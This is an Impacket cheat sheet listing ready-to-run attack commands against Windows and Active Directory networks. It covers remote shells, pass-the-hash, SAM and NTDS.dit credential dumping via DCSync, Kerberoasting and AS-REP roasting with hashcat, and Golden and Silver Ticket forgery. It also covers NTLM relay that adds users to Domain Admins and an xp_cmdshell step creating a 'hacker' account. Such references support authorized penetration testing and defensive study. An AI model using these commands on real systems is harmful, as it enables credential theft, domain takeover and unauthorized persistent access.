# Impacket Examples Cheat Sheet

> Impacket is a collection of Python classes for working with network protocols. All tools are in the `impacket/examples/` directory.
> 
> **Auth format:** `domain/user:password@target` or use `-hashes LM:NT` for pass-the-hash.

---

## Remote Execution

### psexec.py
Full interactive shell via SMB (creates a service).
```bash
psexec.py domain/user:password@192.168.1.10
psexec.py domain/user@192.168.1.10 -hashes :ntlmhash
psexec.py domain/user:password@192.168.1.10 "whoami"
```

### smbexec.py
Shell via SMB without dropping a binary (uses service + output file).
```bash
smbexec.py domain/user:password@192.168.1.10
smbexec.py -hashes :ntlmhash domain/user@192.168.1.10
```

### wmiexec.py
Command execution via WMI. Semi-interactive shell, no service created.
```bash
wmiexec.py domain/user:password@192.168.1.10
wmiexec.py domain/user:password@192.168.1.10 "ipconfig /all"
wmiexec.py -hashes :ntlmhash domain/user@192.168.1.10
```

### atexec.py
Execute commands via Task Scheduler.
```bash
atexec.py domain/user:password@192.168.1.10 "whoami"
atexec.py -hashes :ntlmhash domain/user@192.168.1.10 "net user"
```

### dcomexec.py
Execution via DCOM objects (MMC20, ShellWindows, ShellBrowserWindow).
```bash
dcomexec.py domain/user:password@192.168.1.10 "whoami"
dcomexec.py -object MMC20 domain/user:password@192.168.1.10 "calc.exe"
```

---

## SMB / File Operations

### smbclient.py
Interactive SMB client to browse shares and transfer files.
```bash
smbclient.py domain/user:password@192.168.1.10
smbclient.py -hashes :ntlmhash domain/user@192.168.1.10

# Inside the shell:
# shares          — list shares
# use C$          — connect to share
# ls              — list files
# get file.txt    — download file
# put file.txt    — upload file
```

### smbserver.py
Spin up a quick SMB server to serve files.
```bash
smbserver.py SHARENAME /path/to/serve
smbserver.py -smb2support SHARENAME /tmp/files
smbserver.py -username user -password pass SHARENAME /tmp/files
```

---

## Credential Dumping

### secretsdump.py
Dump SAM, LSA secrets, NTDS.dit hashes remotely or from files.
```bash
# Remote SAM + LSA dump
secretsdump.py domain/user:password@192.168.1.10

# Pass-the-hash
secretsdump.py -hashes :ntlmhash domain/user@192.168.1.10

# DCSync — dump all domain hashes (requires DC)
secretsdump.py -just-dc domain/user:password@dc.domain.local

# Dump only NTLM hashes from DCSync
secretsdump.py -just-dc-ntlm domain/user:password@dc.domain.local

# Dump specific user via DCSync
secretsdump.py -just-dc-user krbtgt domain/user:password@dc.domain.local

# From offline files (SYSTEM + SAM or NTDS.dit)
secretsdump.py -sam SAM -system SYSTEM LOCAL
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Kerberos Attacks

### GetTGT.py
Request a TGT and save it as a `.ccache` file.
```bash
GetTGT.py domain.local/user:password
GetTGT.py domain.local/user -hashes :ntlmhash
GetTGT.py domain.local/user -aesKey <aes256key>

# Use the ticket
export KRB5CCNAME=user.ccache
```

### GetST.py
Request a Service Ticket (TGS). Supports S4U2Self/S4U2Proxy.
```bash
GetST.py domain.local/svcaccount:password -spn cifs/target.domain.local
GetST.py domain.local/svcaccount -hashes :hash -spn cifs/target.domain.local

# S4U2Self + S4U2Proxy (impersonate admin)
GetST.py domain.local/svcaccount:password -spn cifs/target.domain.local -impersonate administrator
```

### GetUserSPNs.py
Kerberoasting — find and request TGS for SPN accounts.
```bash
# List kerberoastable accounts
GetUserSPNs.py domain.local/user:password

# Request hashes for cracking
GetUserSPNs.py domain.local/user:password -request

# Output to file
GetUserSPNs.py domain.local/user:password -request -outputfile kerb_hashes.txt

# Use DC directly
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request
```

Crack with hashcat:
```bash
hashcat -m 13100 kerb_hashes.txt wordlist.txt
```

### GetNPUsers.py
AS-REP Roasting — find users without pre-auth required.
```bash
# With credentials
GetNPUsers.py domain.local/user:password -request

# Without credentials (needs user list)
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass

# Output for hashcat
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

# Specify DC
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.1 -no-pass
```

Crack with hashcat:
```bash
hashcat -m 18200 asrep.txt wordlist.txt
```

### ticketer.py
Forge Golden or Silver Tickets.
```bash
# Golden Ticket (requires krbtgt hash + domain SID)
ticketer.py -nthash <krbtgt_ntlm> -domain-sid S-1-5-21-... -domain domain.local fakeadmin

# Silver Ticket (requires service hash)
ticketer.py -nthash <service_ntlm> -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local fakeadmin

# Use the ticket
export KRB5CCNAME=fakeadmin.ccache
```

### raiseChild.py
Automated child-to-parent domain privilege escalation.
```bash
raiseChild.py domain.local/childadmin:password
raiseChild.py -hashes :ntlmhash domain.local/childadmin
```

---

## Enumeration & LDAP

### GetADUsers.py
Enumerate Active Directory user accounts.
```bash
GetADUsers.py domain.local/user:password -all
GetADUsers.py domain.local/user:password
```

### ldapdomaindump (via impacket LDAP)
```bash
# Use ldapdomaindump separately or query with:
python3 -m impacket.examples.GetADUsers -all domain.local/user:password
```

### samrdump.py
Enumerate users, groups, and shares via SAMR protocol.
```bash
samrdump.py domain/user:password@192.168.1.10
samrdump.py -hashes :ntlmhash domain/user@192.168.1.10
```

### rpcdump.py
Dump RPC endpoints from a target.
```bash
rpcdump.py 192.168.1.10
rpcdump.py domain/user:password@192.168.1.10
```

### lookupsid.py
Brute-force SIDs to enumerate domain users and groups.
```bash
lookupsid.py domain/user:password@192.168.1.10
lookupsid.py -hashes :ntlmhash domain/user@192.168.1.10 0xfff
```

---

## Network Attacks / MITM

### ntlmrelayx.py
Relay captured NTLM authentication to other services.
```bash
# Relay to SMB (dump SAM)
ntlmrelayx.py -tf targets.txt -smb2support

# Relay and execute command
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Relay to LDAP (add user to Domain Admins)
ntlmrelayx.py -tf targets.txt -smb2support -t ldap://dc.domain.local

# Interactive SOCKS mode
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

### responder (used alongside ntlmrelayx)
```bash
# Disable SMB + HTTP in Responder to avoid conflicts with ntlmrelayx
responder -I eth0 -rdw
```

---

## MS-SQL

### mssqlclient.py
Connect to and interact with MSSQL servers.
```bash
mssqlclient.py domain/user:password@192.168.1.10
mssqlclient.py domain/user:password@192.168.1.10 -windows-auth
mssqlclient.py -hashes :ntlmhash domain/user@192.168.1.10 -windows-auth

# Inside the shell:
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami
# SQL> xp_cmdshell "net user hacker P@ss /add"
```

---

## Common Flags Reference

| Flag | Description |
|------|-------------|
| `-hashes LM:NT` | Pass-the-hash authentication |
| `-no-pass` | No password (for AS-REP / anonymous) |
| `-k` | Use Kerberos authentication (needs ccache) |
| `-dc-ip` | Specify domain controller IP |
| `-target-ip` | Specify target IP separately from hostname |
| `-port` | Override default port |
| `-debug` | Verbose debug output |
| `-outputfile` | Save output to file |
| `-just-dc` | DCSync mode (secretsdump) |
| `-just-dc-ntlm` | DCSync, NTLM only |
| `-ts` | Add timestamp to output |

---

## Environment Setup Tips

```bash
# Set Kerberos ticket for use
export KRB5CCNAME=/path/to/ticket.ccache

# Use ticket with any impacket tool
wmiexec.py -k -no-pass domain/user@target.domain.local

# Install impacket
pip install impacket
# or from source
git clone https://github.com/fortra/impacket && cd impacket && pip install .
```
